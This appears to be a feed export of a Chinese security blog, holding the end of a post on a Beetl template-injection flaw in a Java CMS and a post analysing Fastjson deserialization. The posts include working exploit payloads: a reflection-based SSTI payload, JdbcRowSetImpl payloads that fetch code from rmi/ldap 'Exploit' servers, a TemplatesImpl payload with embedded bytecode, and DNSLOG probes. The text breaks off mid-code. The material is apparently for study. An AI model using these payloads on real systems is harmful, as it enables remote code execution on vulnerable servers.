</span>&#123;</span><br><span class="line">        JSONObject array = <span class="keyword">new</span> JSONObject();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String content = <span class="keyword">this</span>.get.get(<span class="string">"content"</span>);</span><br><span class="line">            content = FileManagerUtils.decodeContent(content);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// before bakup</span></span><br><span class="line">            bakupFile(<span class="keyword">new</span> File(getRealFilePath()));</span><br><span class="line"></span><br><span class="line">            FileManagerUtils.writeString(getRealFilePath(), content);</span><br><span class="line">            array.put(<span class="string">"Path"</span>, <span class="keyword">this</span>.get.get(<span class="string">"path"</span>));</span><br><span class="line">            array.put(<span class="string">"Error"</span>, <span class="string">""</span>);</span><br><span class="line">            array.put(<span class="string">"Code"</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JSONException e) &#123;</span><br><span class="line">            logger.error(<span class="string">"JSONObject error"</span>, e);</span><br><span class="line">            <span class="keyword">this</span>.error(<span class="string">"JSONObject error"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(<span class="string">"IOException error"</span>, e);</span><br><span class="line">            <span class="keyword">this</span>.error(<span class="string">"IOException error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 前期可以修改代码机制我们已经了解的很清楚了，没有做任何的防护措施。但这些远远达不到SSTI的要求。<code>判断一个系统或者CMS是否使用了任何一个模板引擎</code>，先有比较大众Java模板引擎有Velocity，Freemarker，而这款模板引擎是beetl，挖掘之间根本没有了解过。据查阅知道，这是一款国产的模板引擎。<a href="http://ibeetl.com/" target="_blank" rel="noopener">官方地址</a>，官网说有很多优势，感觉一般般，吹牛的水分比较大吧。在研究这个模板的时候，官方给<a href="http://ibeetl.com/guide/#/beetl/" target="_blank" rel="noopener">文档</a>真的很差，有些东西说的一知半解没有说清楚。<br><img src="https://img-blog.csdnimg.cn/20200414164508404.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200414165055321.png" alt="在这里插入图片描述"></p><hr><h4 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h4><p>&emsp;&emsp; 查阅官方文档，了解这款模板引擎调用Java方法和属性模式。<br><img src="https://img-blog.csdnimg.cn/20200414171840853.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 本文构造payload得有简单Java的反射机制基础。<a href="https://www.cnblogs.com/haha12/p/4724204.html" target="_blank" rel="noopener">推荐文章</a>，文章中用了一个简单案例再现了Java的反射。<a href="https://blog.csdn.net/SECURE2/article/details/81099574?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">推荐文章</a>,文章用很多解释是关于Java反射和类加载的知识内容。[新增]<a href="https://www.bilibili.com/video/BV1s4411U7x9?from=search&seid=13854513651556834308" target="_blank" rel="noopener">推荐视频</a><br>[video(video-hkteTk7M-1587384668444)(type-bilibili)(url-<a href="https://player.bilibili.com/player.html?aid=63805421)(image-https://ss.csdn.net/p?http://i0.hdslb.com/bfs/archive/3ea308d0ab04ed422f45dc47274940762348f4fa.jpg)(title-【Java反射机制】不懂反射机制不配当java程序员?)]" target="_blank" rel="noopener">https://player.bilibili.com/player.html?aid=63805421)(image-https://ss.csdn.net/p?http://i0.hdslb.com/bfs/archive/3ea308d0ab04ed422f45dc47274940762348f4fa.jpg)(title-【Java反射机制】不懂反射机制不配当java程序员?)]</a></p><h4 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h4><p>&emsp;&emsp; 这里笔者将payload拆解了，方便更好的解读一下payload。由于beetl模板引擎禁止了<code>java.lang.Runtime</code>和<code>java.lang.Process</code>，所以这里不能直接调用进程来达到远程代码执行的效果。这里采用Java反射机制来达到效果，当然也有其他的方法，比例写文件等。读者们可以自行尝试。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; <strong>先忽视上面的payload，下面会一步步解答，最后完整的payload</strong><br><img src="https://img-blog.csdnimg.cn/2020041418081219.png" alt="在这里插入图片描述"></p><ol><li>我们且看第一行，按照上面给出简单案例方法，我们应该这样子就可以了<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(newInstance(),&quot;calc&quot;)</code></li><li>但是直接String.class直接写模板是找不到的，所以我们得继续构造payload，将String.class转化<code>@java.lang.Class.forName(&quot;java.lang.String&quot;)</code>的形式，然后payload就变成下面这样子了。<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,@java.lang.Class.forName(&quot;java.lang.String&quot;)).invoke(newInstance(),&quot;calc&quot;)</code></li><li>照道理上面就可以直接使用了，但是呢Runtime类没有无参构造方法，因此不能使用newInstance()方法来实例化。只能通过调用getRuntime()方法来进行实例化。所以newInstance()得替换成<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null)</code>最终payload就变成了下面这样子。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 遇到使用了模板的解析CMS可以根据模板解析语言尝试执行命令，若遇到函数警用的情况可以尝试一些Bypass方法，比例一些反射、反序列化、字节码修改等。SSTI注入难的其实如何构造Payload，构造好了之后一切自然而然了。</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://ibeetl.com/guide/#/beetl/basic?id=%e7%9b%b4%e6%8e%a5%e8%b0%83%e7%94%a8java%e6%96%b9%e6%b3%95%e5%92%8c%e5%b1%9e%e6%80%a7" target="_blank" rel="noopener">http://ibeetl.com/guide/#/beetl/basic?id=%e7%9b%b4%e6%8e%a5%e8%b0%83%e7%94%a8java%e6%96%b9%e6%b3%95%e5%92%8c%e5%b1%9e%e6%80%a7</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; 学了一两个月的Java代码审计，对一些审计有了一定了解了。所以决定审计一下JavaWeb CMS，随便申请一下CV
      
    
    </summary>
    
    
    
      <category term="Java 文件上传" scheme="https://summersec.github.io/tags/Java-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>逆向学习fastjson反序列化始</title>
    <link href="https://summersec.github.io/2020/07/23/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%8B/"/>
    <id>https://summersec.github.io/2020/07/23/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%8B/</id>
    <published>2020-07-23T00:22:16.000Z</published>
    <updated>2020-07-29T06:03:12.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; Fastjson这款国内知名的解析json的组件，笔者在此就不多介绍，网络上有很多分析学习fastjson反序列化漏洞文章。笔者在此以一种全新角度从分析payload构造角度出发，逆向学习分析fastjson反序列化漏洞始末。<br>ps：漏洞学习环境以代码均在上传<a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">Github项目</a>。</p><hr><h1 id="初窥Payload"><a href="#初窥Payload" class="headerlink" title="初窥Payload"></a>初窥Payload</h1><p>&emsp;&emsp; 下面是一段最简单<code>Fastjson的版本号反序列化--URLDNS</code>代码，观察发现可以提出一个问题<code>@type</code>作用？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">urldns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// dnslog平台网站：http://www.dnslog.cn/</span></span><br><span class="line">        String payload = <span class="string">"&#123;&#123;\"@type\":\"java.net.URL\",\"val\""</span> +</span><br><span class="line">                <span class="string">":\"http://h2a6yj.dnslog.cn\"&#125;:\"summer\"&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="type的作用"><a href="#type的作用" class="headerlink" title="@type的作用"></a>@type的作用</h2><p>&emsp;&emsp; 下面是一段实验代码，帮助理解分析<code>@type</code>的由来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vul.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line"><span class="comment">//TODO 修改pom.xml中的fastjson &lt;= 1.2.24</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setAge(<span class="number">18</span>);</span><br><span class="line">        user.setName(<span class="string">"summer"</span>);</span><br><span class="line">        String str1 = JSONObject.toJSONString(user);</span><br><span class="line">        <span class="comment">// 转化的时候加入一个序列化的特征 写入类名</span></span><br><span class="line">        <span class="comment">// feature = 特征</span></span><br><span class="line">        String str2 = JSONObject.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        <span class="comment">// str2输入结果会输出 @type+类名</span></span><br><span class="line">        <span class="comment">// 由此可知@type是用于解析JSON时的用于指定类</span></span><br><span class="line">        System.out.println(str1);</span><br><span class="line">        System.out.println(str2);</span><br><span class="line">        <span class="comment">//如果fastjson解析内容时没有配置，会默认使用缺省配置</span></span><br><span class="line">        <span class="comment">// TODO 查看parse方法 可以设置断点看看不同之处和相同之处</span></span><br><span class="line">        Object parse1 = JSON.parse(str1);</span><br><span class="line">        Object parse2 = JSON.parse(str2);</span><br><span class="line">        <span class="comment">//很明显的结果不一样</span></span><br><span class="line">        System.out.println(<span class="string">"@type: "</span> + parse1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"str1's parse1: "</span> + parse1);</span><br><span class="line">        System.out.println(<span class="string">"@type: "</span> + parse2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"str2's parse2: "</span> + parse2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200720142150824.png" alt="在这里插入图片描述"></p><p>&emsp;&emsp; 对比分析一下，只要在JSON序列化的方法加入<code>SerializerFeature.WriteClassName</code>特征字段。序列化出来的结果会在开头加一个<code>@type</code>字段，值为进行序列化的类名。再将带有<code>@type</code>字段的序列化数据进行反序列化会得到对应的实例类对象。反序列化可以获取类对象？有Java基础的安全人应该会敏感的这里十之八九存在漏洞。<br>ps： 下面是一段验证代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Vuldemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"vul.fastjson.User\",\"age\":18,\"name\":\"summer\"&#125;"</span>;</span><br><span class="line">        Object ob = JSON.parse(payload);</span><br><span class="line">System.out.println(<span class="string">"反序列化后类对象:  "</span> + ob.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"反序列化结果: "</span> + ob);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200720142644574.png" alt="在这里插入图片描述"></p><hr><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="RCE’s-payload"><a href="#RCE’s-payload" class="headerlink" title="RCE’s payload"></a>RCE’s payload</h2><p>&emsp;&emsp; 第一种payload是使用<code>com.sun.rowset.JdbcRowSetImpl</code>类，第二种是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>。第二种之前在<a href="https://samny.blog.csdn.net/article/details/106160182" target="_blank" rel="noopener">漫谈Commons-Collections反序列化</a>讨论分析过，这里不再重复着重讨论分析第一种payload。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"rmi://127.0.0.1:1090/Exploit"</span>,<span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="string">"_bytecodes"</span>:[<span class="string">"yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ="</span>],<span class="string">'_name'</span>:<span class="string">'a.b'</span>,<span class="string">'_tfactory'</span>:&#123; &#125;,<span class="string">"_outputProperties"</span>:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="再窥Payload"><a href="#再窥Payload" class="headerlink" title="再窥Payload"></a>再窥Payload</h2><p>&emsp;&emsp; 观察发现这个payload由三部分组成，<code>@type</code>、<code>dataSourceName</code>、<code>autoCommint</code>。第一个<code>@type</code>前面已经提及了是获取实例化类，<code>dataSourceName</code>和<code>autoCommit</code>我们看看官方文档。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String payload =   <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span> +</span><br><span class="line">              <span class="string">"\"dataSourceName\":\"rmi://localhost:1090/Exploit\",\"autoCommit\":true&#125;"</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 大致意思：使用该方法的名称绑定到<code>JNDI命名服务</code>中的<code>DataSource</code>对象上，应用程序就可以使用该名称进行查找，检索绑定到它的DataSource对象。<br><img src="https://img-blog.csdnimg.cn/20200720140337267.png" alt="在这里插入图片描述">&emsp;&emsp; 设置<code>AutoCommit</code>后，会<code>自动提交内容</code>。设置这个属性之后，JNDI找到对应资源，对自动提交内容，读者后期可以试试删除这个属性是不会触发漏洞的。<br><img src="https://img-blog.csdnimg.cn/20200720140401249.png" alt="在这里插入图片描述"><br><strong>知道上面这些特性后，根据特点构造等价代码</strong><br><a href="http://www.herongyang.com/JDBC/MySQL-JdbcRowSet-DataSource.html" target="_blank" rel="noopener">国外介绍JdbcRowSet 使用方法的一个小案例，可以参考一下。</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl jdbcRowSet = <span class="keyword">new</span> JdbcRowSetImpl();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            jdbcRowSet.setDataSourceName(<span class="string">"ldap://127.0.0.1:1389/Exploit"</span>);</span><br><span class="line">            jdbcRowSet.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">            throwables.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h1><p>&emsp;&emsp; JSON#parse()方法会调用<code>DefaultJSONParser#parse()</code>，在实例化DefaultJSONParser类是会将输入数据使用实例化JSONScanner类传入，并同时传入默认缺省配置<code>features</code>。<br><img src="https://img-blog.csdnimg.cn/20200720150738738.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720150903703.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 这个 lexer 属性实际上是在 DefaultJSONParser 对象被实例化的时候创建的。<br><img src="https://img-blog.csdnimg.cn/20200720151203563.png" alt="在这里插入图片描述"><br>&emsp;&emsp; DefaultJSONParser在实例化时会读取当前字符<code>ch={</code>，所以<code>lexer.token()=12</code>。<br><img src="https://img-blog.csdnimg.cn/20200720151810322.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2020072015182461.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 跳转12会创建JSONObject类对象，然后再调用 <code>DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>方法去解析。<br><img src="https://img-blog.csdnimg.cn/2020072015285868.png" alt="在这里插入图片描述"><br>&emsp;&emsp; DefaultJSONParser#parseObject前面会做一个简单判断<code>lexer.token()</code>，然后读取字符判断是否<code>ch==&#39;&quot;&#39;</code>，TRUE就获取其中的字段的值<code>@type</code>并紧接着判断<code>key == JSON.DEFAULT_TYPE_KEY</code>相等。<br><img src="https://img-blog.csdnimg.cn/20200720153408265.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720170453343.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720171815712.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 接下去进入反序列化阶段<code>deserializer#deserialze()</code>–&gt;<code>parseRest()</code>–&gt;<code>fieldDeser#setValue</code>–&gt;一系列反射调用–&gt;<code>JdbcRowSetImpl#setAutoCommit()</code>触发漏洞。</p><p><img src="https://img-blog.csdnimg.cn/20200720173838924.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720174044552.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720174142800.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720174203729.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720174332739.png" alt="在这里插入图片描述"><br><strong>最后得到Gadget chain如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gadget chain:</span></span><br><span class="line"><span class="comment"> *      JSON.parse()</span></span><br><span class="line"><span class="comment"> *          DefaultJSONParser.parse()</span></span><br><span class="line"><span class="comment"> *              DefaultJSONParser.parseObject()</span></span><br><span class="line"><span class="comment"> *                  JavaBeanDeserializer.deserialze()</span></span><br><span class="line"><span class="comment"> *                      JavaBeanDeserializer.parseRest()</span></span><br><span class="line"><span class="comment"> *                          FieldDeserializer.setValue()</span></span><br><span class="line"><span class="comment"> *                              Reflect.invoke()</span></span><br><span class="line"><span class="comment"> *                                  JdbcRowSetImpl.setAutoCommit()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200720185616310.png" alt="在这里插入图片描述"></p><hr><h1 id="DNSLOG的一个小点"><a href="#DNSLOG的一个小点" class="headerlink" title="DNSLOG的一个小点"></a>DNSLOG的一个小点</h1><p>&emsp;&emsp; 实战挖掘fastjson漏洞的时候比较常用的方法，探测Fastjson是用dnslog方式，探测到了再用RCE Payload去一个一个打。但是本人在本地环境测试的时候发现了几个不同点，fastjson的版本不同，不同的payload成功概率是不同的。至于为什么是这样子，可以参考一下这篇<a href="http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/" target="_blank" rel="noopener">通过dnslog探测fastjson的几种方法</a>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目前最新版1.2.72版本可以使用1.2.36 &lt; fastjson &lt;= 1.2.72</span></span><br><span class="line">String payload = <span class="string">"&#123;&#123;\"@type\":\"java.net.URL\",\"val\""</span> +</span><br><span class="line">        <span class="string">":\"http://9s1euv.dnslog.cn\"&#125;:\"summer\"&#125;"</span>;</span><br><span class="line"><span class="comment">// 全版本支持 fastjson &lt;= 1.2.72</span></span><br><span 